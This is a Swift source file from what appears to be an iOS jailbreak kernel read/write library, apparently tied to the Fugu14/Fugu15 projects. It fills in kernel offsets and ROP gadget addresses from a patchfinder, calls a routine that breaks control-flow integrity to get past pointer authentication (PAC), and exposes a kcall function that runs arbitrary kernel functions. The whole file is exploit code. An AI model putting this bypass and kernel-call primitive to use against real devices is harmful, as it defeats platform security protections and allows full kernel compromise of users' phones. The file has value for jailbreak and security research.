//
//  Kcall.swift
//  KRW
//
//  Created by Linus Henze on 2023-01-14.
//  Copyright © 2023 Pinauten GmbH. All rights reserved.
//  

import Foundation
import KRWC

public extension KRW {
    static func doPacBypass() throws {
        try doInit()
        
        guard !didInitPAC else {
            return
        }
        
        gOffsets.slide = try kslide()
        gOffsets.allproc = (patchfinder.allproc!)
        gOffsets.itkSpace = patchfinder.ITK_SPACE!
        gOffsets.cpu_ttep = (patchfinder.cpu_ttep!)
        gOffsets.pmap_enter_options_addr = (patchfinder.pmap_enter_options_addr!)
        gOffsets.hw_lck_ticket_reserve_orig_allow_invalid_signed  = (patchfinder.hw_lck_ticket_reserve_orig_allow_invalid_signed!)
        gOffsets.hw_lck_ticket_reserve_orig_allow_invalid = (patchfinder.hw_lck_ticket_reserve_orig_allow_invalid!)
        gOffsets.brX22 = (patchfinder.br_x22_gadget!)
        gOffsets.exceptionReturn = (patchfinder.exception_return!)
        gOffsets.ldp_x0_x1_x8_gadget = (patchfinder.ldp_x0_x1_x8_gadget!)
        gOffsets.exception_return_after_check = (patchfinder.exception_return_after_check!)
        gOffsets.exception_return_after_check_no_restore = (patchfinder.exception_return_after_check_no_restore!)
        gOffsets.str_x8_x9_gadget = (patchfinder.str_x8_x9_gadget!)
        gOffsets.str_x0_x19_ldr_x20 = (patchfinder.str_x0_x19_ldr_x20!)
        gOffsets.pmap_set_nested = (patchfinder.pmap_set_nested!)
        gOffsets.pmap_nest = (patchfinder.pmap_nest!)
        gOffsets.pmap_remove_options = (patchfinder.pmap_remove_options!)
        gOffsets.pmap_mark_page_as_ppl_page = (patchfinder.pmap_mark_page_as_ppl_page!)
        gOffsets.pmap_create_options = (patchfinder.pmap_create_options!)
        gOffsets.ml_sign_thread_state = (patchfinder.ml_sign_thread_state!)
        gOffsets.kernel_el_cpsr = patchfinder.kernel_el! << 2
        gOffsets.TH_RECOVER = patchfinder.TH_RECOVER!
        gOffsets.TH_KSTACKPTR = patchfinder.TH_KSTACKPTR!
        gOffsets.ACT_CONTEXT = patchfinder.ACT_CONTEXT!
        gOffsets.ACT_CPUDATAP = patchfinder.ACT_CPUDATAP!
        gOffsets.PORT_KOBJECT = 0
        gOffsets.VM_MAP_PMAP = patchfinder.VM_MAP_PMAP!
        gOffsets.PORT_LABEL = patchfinder.PORT_LABEL!
        
        gOurTask = ourProc!.task!.address
        
        if !breakCFI(try kbase()) {
            throw KRWError.failed(providerError: 1337)
        }
        
        print("[+++] Bypassed PAC!")
        
        setupFugu14Kcall()
        deinitFugu15PACBypass()
        
        print("[+++] Inited Fugu14 kcall!")
        
        didInitPAC = true
    }
    
    static func kcall(func: UInt64, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        try doPacBypass()
        
        return KRWC.kcall(`func`, a1, a2, a3, a4, a5, a6, a7, a8)
    }
}
